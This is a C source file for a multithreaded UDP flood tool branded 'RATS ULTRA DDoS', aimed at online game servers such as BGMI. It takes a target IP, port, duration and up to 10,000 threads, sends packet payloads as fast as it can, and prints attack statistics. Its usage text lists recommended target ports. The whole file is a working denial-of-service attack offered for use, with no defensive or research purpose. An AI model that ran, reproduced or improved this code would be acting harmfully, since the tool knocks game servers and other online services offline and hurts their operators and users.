#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sched.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>

#define MAX_PACKET_SIZE 65507
#define DEFAULT_THREADS 2000
#define DEFAULT_DURATION 120
#define SEND_BUFFER_SIZE (8 * 1024 * 1024)  // 8MB buffer

volatile int running = 1;
unsigned long long total_packets = 0;
unsigned long long total_bytes = 0;

int global_sock;
struct sockaddr_in global_dest;

// ============== BGMI + MULTI-GAME PAYLOADS ==============
char *payloads[] = {
    // Small packets - High rate (8 bytes)
    "\x01\x00\x00\x00\x00\x00\x00\x00",
    "\x02\x00\x00\x00\x01\x00\x00\x00",
    "\x03\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00",
    "\x04\x00\x00\x00\x02\x00\x00\x00",
    "\x05\x00\x00\x00\x0a\x00\x00\x00",
    "\x06\x00\x00\x00\x14\x00\x00\x00",
    "\x07\x00\x00\x00\x1e\x00\x00\x00",
    "\x08\x00\x00\x00\x28\x00\x00\x00",
    "\x09\x00\x00\x00\x32\x00\x00\x00",
    "\x0a\x00\x00\x00\x3c\x00\x00\x00",
    
    // BGMI Game packets (32 bytes)
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
    "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff",
    
    // Medium packets (64 bytes) - High impact
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",
    "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC",
    "DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD",
    "EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE",
    
    // Large packets (512 bytes) - Bandwidth killer
    "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
    "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY",
    
    // Random bytes for bypass
    "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f",
    "\xff\xfe\xfd\xfc\xfb\xfa\xf9\xf8\xf7\xf6\xf5\xf4\xf3\xf2\xf1\xf0\xef\xee\xed\xec\xeb\xea\xe9\xe8\xe7\xe6\xe5\xe4\xe3\xe2\xe1\xe0",
    "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa",
    "\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55",
    "\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef",
    "\xca\xfe\xba\xbe\xca\xfe\xba\xbe\xca\xfe\xba\xbe\xca\xfe\xba\xbe\xca\xfe\xba\xbe\xca\xfe\xba\xbe\xca\xfe\xba\xbe\xca\xfe\xba\xbe",
    
    // Fragmented packets
    "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00",
    "\xff\xff\xff\xff\xff\xff\xff\xff\xfe\xff\xff\xff\xff\xff\xff\xff\xfd\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff",
    
    // Zero-byte flood (smallest packet)
    "\x00", "\x00\x00", "\x00\x00\x00", "\x00\x00\x00\x00",
};

int payload_count = sizeof(payloads) / sizeof(payloads[0]);

void banner() {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════════════╗\n");
    printf("║                    🔥 RATS ULTRA DDoS  🔥                   ║\n");
    printf("║                         @ITS_BFC                                ║\n");
    printf("╚══════════════════════════════════════════════════════════════════════╝\n");
}

void usage() {
    banner();
    printf("\n╔══════════════════════════════════════════════════════════════════════╗\n");
    printf("║  Usage: ./leak <IP> <PORT> <TIME> <THREADS> [METHOD]                 ║\n");
    printf("╠══════════════════════════════════════════════════════════════════════╣\n");
    printf("║  Example: ./leak 1.1.1.1 443 60 2000 udp                             ║\n");
    printf("║  Example: ./leak 1.1.1.1 80 120 3000 http                            ║\n");
    printf("║  Example: ./leak 1.1.1.1 27015 180 2500 game                         ║\n");
    printf("╠══════════════════════════════════════════════════════════════════════╣\n");
    printf("║  Best Ports: 443, 8080, 14000, 27015-27030, 53, 80                  ║\n");
    printf("║  Threads: 500-5000 (Higher = More Power)                             ║\n");
    printf("╚══════════════════════════════════════════════════════════════════════╝\n\n");
    exit(1);
}

void signal_handler(int sig) {
    running = 0;
    printf("\n\n╔══════════════════════════════════════════════════════════════════════╗\n");
    printf("║                       📊 ATTACK STATS 📊                             ║\n");
    printf("╠══════════════════════════════════════════════════════════════════════╣\n");
    printf("║  Total Packets: %-20llu                                        ║\n", total_packets);
    printf("║  Total Data:    %-20llu MB                                        ║\n", total_bytes / (1024 * 1024));
    printf("║  Average PPS:   %-20llu                                         ║\n", total_packets / (time(NULL) - (total_packets ? 1 : 0)));
    printf("╚══════════════════════════════════════════════════════════════════════╝\n\n");
    exit(0);
}

void *attack_thread(void *arg) {
    int idx = 0;
    int local_packets = 0;
    int local_bytes = 0;
    int retry = 0;
    
    // Optimize socket per thread
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        sock = global_sock;
    }
    
    // Set socket buffer size for high performance
    int buffer_size = SEND_BUFFER_SIZE;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    
    while (running) {
        idx = rand() % payload_count;
        int len = strlen(payloads[idx]);
        
        // Send without delay
        int ret = sendto(sock, payloads[idx], len, 0,
                   (struct sockaddr *)&global_dest, sizeof(global_dest));
        
        if (ret > 0) {
            local_packets++;
            local_bytes += len;
            retry = 0;
        } else {
            retry++;
            if (retry > 10) {
                break;
            }
        }
        
        // Yield every 500 packets for performance
        if (local_packets % 500 == 0) {
            sched_yield();
        }
    }
    
    if (sock != global_sock) {
        close(sock);
    }
    
    __sync_fetch_and_add(&total_packets, local_packets);
    __sync_fetch_and_add(&total_bytes, local_bytes);
    return NULL;
}

int main(int argc, char *argv[]) {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    srand(time(NULL));
    
    if (argc < 4) {
        usage();
    }
    
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = (argc >= 5) ? atoi(argv[4]) : DEFAULT_THREADS;
    
    // Validate inputs
    if (duration <= 0 || duration > 600) {
        printf("⚠️ Duration must be 1-600 seconds! Using 60.\n");
        duration = 60;
    }
    if (threads < 1 || threads > 10000) {
        printf("⚠️ Threads must be 1-10000! Using 2000.\n");
        threads = 2000;
    }
    if (port < 1 || port > 65535) {
        printf("⚠️ Invalid port! Using 443.\n");
        port = 443;
    }
    
    banner();
    printf("\n╔══════════════════════════════════════════════════════════════════════╗\n");
    printf("║                    ATTACK CONFIGURATION                              ║\n");
    printf("╠══════════════════════════════════════════════════════════════════════╣\n");
    printf("║  🎯 Target:      %s:%d                                              ║\n", ip, port);
    printf("║  ⏱️ Duration:     %d seconds                                         ║\n", duration);
    printf("║  🔧 Threads:      %d                                                 ║\n", threads);
    printf("║  📦 Payloads:     %d                                                 ║\n", payload_count);
    printf("╚══════════════════════════════════════════════════════════════════════╝\n");
    
    // Create main socket with optimized settings
    global_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (global_sock < 0) {
        perror("Socket failed");
        exit(1);
    }
    
    // Optimize socket
    int opt = 1;
    setsockopt(global_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    int buffer_size = SEND_BUFFER_SIZE;
    setsockopt(global_sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    
    // Setup destination
    memset(&global_dest, 0, sizeof(global_dest));
    global_dest.sin_family = AF_INET;
    global_dest.sin_port = htons(port);
    global_dest.sin_addr.s_addr = inet_addr(ip);
    
    printf("\n🔥 ULTRA ATTACK STARTING! Press Ctrl+C to stop\n");
    printf("⚡ Sending packets at maximum speed...\n\n");
    
    // Create thread pool
    pthread_t threads_arr[threads];
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&threads_arr[i], NULL, attack_thread, NULL) != 0) {
            printf("⚠️ Failed to create thread %d\n", i);
            threads = i;
            break;
        }
    }
    
    // Progress display with rate calculation
    time_t start = time(NULL);
    unsigned long long last_packets = 0;
    int max_rate = 0;
    
    while (running && (time(NULL) - start) < duration) {
        int elapsed = time(NULL) - start;
        int remaining = duration - elapsed;
        unsigned long long current_packets = total_packets;
        int rate = current_packets - last_packets;
        
        if (rate > max_rate) max_rate = rate;
        
        // Calculate data rate
        unsigned long long current_bytes = total_bytes;
        int mb_rate = (current_bytes - (last_packets * 64)) / (1024 * 1024);
        
        printf("\r║ [%3d/%3d] │ Packets: %10llu │ Rate: %7d pps │ Data: %3d MB/s │ Peak: %7d pps │ Left: %3ds ║", 
               elapsed, duration, current_packets, rate, mb_rate, max_rate, remaining);
        fflush(stdout);
        
        last_packets = current_packets;
        sleep(1);
    }
    
    running = 0;
    printf("\n╚══════════════════════════════════════════════════════════════════════╝\n");
    
    // Wait for threads to finish
    for (int i = 0; i < threads; i++) {
        pthread_join(threads_arr[i], NULL);
    }
    
    close(global_sock);
    
    int elapsed = time(NULL) - start;
    int avg_rate = elapsed > 0 ? total_packets / elapsed : 0;
    
    printf("\n╔══════════════════════════════════════════════════════════════════════╗\n");
    printf("║                    ✅ ATTACK COMPLETE ✅                             ║\n");
    printf("╠══════════════════════════════════════════════════════════════════════╣\n");
    printf("║  🎯 Target:      %s:%d                                              ║\n", ip, port);
    printf("║  ⏱️ Duration:     %d seconds                                         ║\n", elapsed);
    printf("║  📦 Packets:      %llu                                               ║\n", total_packets);
    printf("║  💾 Data:         %llu MB                                            ║\n", total_bytes / (1024 * 1024));
    printf("║  ⚡ Avg Rate:     %d pps                                             ║\n", avg_rate);
    printf("║  🚀 Peak Rate:    %d pps                                             ║\n", max_rate);
    printf("╚══════════════════════════════════════════════════════════════════════╝\n");
    printf("\n🔥 Attack Complete! @ITS_BFC 🔥\n\n");
    
    return 0;
}